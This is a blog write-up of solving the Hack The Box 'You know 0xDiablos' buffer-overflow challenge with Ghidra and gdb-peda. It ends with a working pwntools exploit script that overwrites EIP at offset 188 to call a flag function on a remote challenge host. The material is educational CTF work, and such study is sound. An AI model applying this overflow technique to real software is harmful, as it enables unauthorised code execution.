# You know 0xDiablo

{% embed url="https://haxez.org/2023/03/hack-the-box-you-know-0xdiablos-writeup/" %}

## Hack The Box You know 0xDiablos Writeup

Posted on [March 21, 2023](https://haxez.org/2023/03/hack-the-box-you-know-0xdiablos-writeup/)by [Jonobi Musashi](https://haxez.org/author/joe\_g13568c7/)

Hello world, welcome to [Haxez](https://haxez.org/). You know 0xDiablos is a Pwn challenge created by [RET2pwn](https://app.hackthebox.com/users/47422) on [Hack The Box](https://hackthebox.com/). From my understanding, Pwn challenges are buffer overflow challenges. Honestly, I’ve only ever done one buffer overflow challenge before so I don’t have a clue what I’m doing. I’m going to be following this walkthrough [>>here<< ](https://shakuganz.com/2021/06/08/hackthebox-you-know-0xdiablos-write-up/)to get a better understanding of what to do.

### Static Analysis With Ghidra

As mentioned, I have no idea what I’m doing so the first thing I’m going to do is run the binary. I downloaded the zip file from Hack The Box and extracted it. There was a file called vuln and running it produces the output “You know who are 0xDiablos”.

```
┌──(kali㉿kali)-[/media/sf_OneDrive/Hack The Box/Pwn]
└─$ ./vuln                                                                                            
You know who are 0xDiablos: 
```

#### Main

I opened the vuln binary in Ghidra and looked at the ‘main’ function as that seems to be where everyone starts. You can see from the screenshot below that the main function doesn’t do much other than output “You know who are 0xDiablos: ” and call the ‘vuln’ function.

#### Vuln

According to the author of the blog I’m reading, it is clear that this is a buffer overflow challenge. A char array is being declared but there is no limit to the number of characters being read. I know this is almost exactly what the author said but I can’t think of another way to word it.

#### Flag

Ultimately our goal is to find a way to break the program and get the flag. The flag function is responsible for opening the flag. I’m a bit unclear as to whether we need to perform a buffer overflow to call this function or to get access to the host. Surely, if we can execute system commands we can send ourselves a reverse shell and cat the flag? This is only my second buffer overflow.

### Checking For Protections With Checksec

Next, I ran the tool checksec against the binary to see what protections were in place. Please excuse my terminology if it’s incorrect. Also, please reach out if you have a better methodology for doing all of this. I’m genuinely struggling with the process. I’m sure it will get better with the more I do but if you (the reader) are struggling with these challenges then know that you’re not alone.

I’ve heard the terms Stack Canary and others before but I have no idea what they are. This blog is to document my learning process so I’m going to be wrong frequently. Based on the screenshot below, it appears that there aren’t many protections in place. However, I don’t know what having protections in place would look like. I assume that it would show values for the different options.

```
┌──(kali㉿kali)-[/media/sf_OneDrive/Hack The Box/Pwn]
└─$ checksec --file=./vuln
```

### Checking For Protections With gdb-peda

I’m following multiple blogs now because I’m struggling to follow some steps in the other one. The author jumps straight to the entry point in Ghidra but I can’t find it. However, [this other blog](https://weshsec.medium.com/htb-you-know-0xdiablos-4ad297fe75c0) I’m reading has gone through the same process but with GDB instead of Ghidra. Anyway, there is another way to check the protections so I wanted to include it here. It does seem that my installation is a little broken but it is always good to have multiple tools for the same task.

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

### Dynamic Analysis with GDB

Using the GNU Debugger we can run the binary and find the entry point. An entry point of a program is the point in the code where the execution of the program begins. It is the first instruction that is executed when the program is run. In other words, the entry point is the starting point of the program’s execution.

In many programming languages, the entry point is typically a function or a method that is defined with a specific name, such as “main” in C or C++ or “def main()” in Python. When the program is run, the operating system loads the program into memory and then calls the entry point to begin its execution.

The entry point is a crucial component of any program, as it defines the initial behaviour of the program and sets the stage for all subsequent actions. It is often the first place where errors or bugs can be detected, and as such, it is important to ensure that the entry point is well-designed, robust, and error-free. The screenshot below shows me passing the vuln binary to gdb and then running the info file.

```
Entry point: 0x80490d0
```

This is where I ran into trouble. The author of the original post I was reading jumps straight from finding the entry point in GDB to finding it in Ghidra. I found it in Ghidra but I couldn’t figure out how to search for it in Ghidra. After an hour of Googling, using ChatGPT and blindly poking at Ghidra, I gave up. Sure, I can find it manually but if it was a bigger program I would struggle. I hate having gaps in my methodology so this is a breakpoint!

### You know 0xDiablos Break Point

Every time I try to learn buffer overflows (it’s been a few), I always reach my breaking point. Hopefully, one day I won’t struggle as much. Using GDP we can start the program. It seems that peda automatically finds a breakpoint for us. The author explains that we know the value is going to be stored in a 180-sized buffer so a string of 200 characters should be enough to crash it.

Ok, how do we know it’s going to be stored in a 180-sized buffer? am I missing something obvious here? where does it say that? I can’t see it in Ghidra and I can’t see it in the output below. I’m now tempted to stop and find another blog that explains this. However, I know you can fuzz a program with Python and it will tell you exactly how many characters it took to crash it. I’m happy to move forward without knowing how we got this number.

### You know 0xDiablos BOF POC

As mentioned previously, we can test whether the binary is vulnerable to buffer overflow by using python to pass it characters. The screenshot below shows that there was a segmentation fault which I assume means it crashed. Obviously, you wouldn’t want to do this to anything in a production environment as it would crash the program and potentially the server. That would be a denial of service and would get you into trouble.

```
┌──(kali㉿kali)-[/media/sf_OneDrive/Hack The Box/Pwn]
└─$ python3 -c "print('A'* 200)" | ./vuln
```

However, we’re going to continue using gdb-peda and create a pattern with that. As you can see from the screenshot below, I created a pattern of 200 characters.

```
gdb-peda$ pattern_create 200 pattern.txt
Writing pattern of 200 chars to filename "pattern.txt"
```

We can now run the program again and pass it the pattern.txt file to exceed the array and crash the program.

```
gdb-peda$ r < pattern.txt
```

The information produced by gdp-peda tells us that the EIP register now holds the value of ‘AwAA’ (EIP: 0x41417741 (‘AwAA’)). Knowing this, we can determine precisely how many characters it took to overflow the buffer.

### You know 0xDiablos The Instruction Pointer

The EIP (Instruction Pointer) register is a register in the x86 architecture of computer processors that stores the memory address of the next instruction to be executed by the processor. It is also known as the program counter (PC) in other architectures.

When a processor executes a program, it reads instructions from memory sequentially and updates the EIP register to point to the next instruction in memory. The EIP register is a 32-bit register on 32-bit x86 processors and a 64-bit register on 64-bit x86 processors.

The EIP register is an important component of the processor’s execution pipeline, which fetches, decodes, and executes instructions. The processor uses the EIP register to determine the location of the next instruction to fetch from memory and execute.

Programmers can modify the EIP register using various programming techniques such as branching and jumping instructions to change the flow of execution of a program.

We can control the pattern offset by using the pattern\_offset command.

```
gdb-peda$ pattern_offset 0x41417741
1094809409 found at offset: 188
```

### Returning The Flag Function

In order to return the flag, we need to know where the flag function starts. That way we can tell the program to jump to that function when doing the overflow. Using the ‘disas’ and supplying the flag function, we can see that the beginning memory address register for the flag function is ‘0x080491e2’.

To explain, we can create a script that sends a string to the program that will overflow the buffer. Then when the buffer is exceeded, we write the base memory register to the Instruction Pointer so that the flag function gets executed. This will then return the flag and solve the challenge. I think that’s what we’re doing anyway.

```
gdb-peda$ disas flag
Dump of assembler code for function flag:
   0x080491e2 <+0>:     push   ebp
```

### Capture The Flag

Now that we’ve done all the hard work of identifying the vulnerability, and finding out the EIP offset and flag functions base memory address register, let’s steal someone else script. I’m going to use the script found [here](https://shakuganz.com/2021/06/08/hackthebox-you-know-0xdiablos-write-up/) and change the IP address.

Yes, I should absolutely write my own script. I have no excuse other than I don’t really know how. I also don’t fancy spending a whole evening trying to make one from scratch. Instead, I will steal this script, work out what it is doing and then try to learn from it.

```
from pwn import *

context.update(arch="i386", os="linux")

elf = ELF("./vuln")

# offset to reach right before return address's location
offset = b"A" * 188

# craft exploit: offset + flag() + padding + parameter 1 + parameter 2
exploit = offset + p32(elf.symbols['flag'], endian="little") + p32(0x90909090) + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")

r = remote("178.62.61.23", 32355)
#r = elf.process()
r.sendlineafter(":", exploit)
r.interactive()
```

### You know 0xDiablos Review

Obviously, I struggled with this. It is only my second time though so I will cut myself some slack. Also, it’s been 15 years since I learnt assembly at college. The challenge is great but I definitely struggle with the methodology. Every post I read about buffer overflows uses a different methodology and tools. It drives me insane trying to find the most efficient process when everyone is different. I suppose it’s the same with all areas of hacking, people use different tools for different things.

Note to self, stop procrastinating and learn Python!
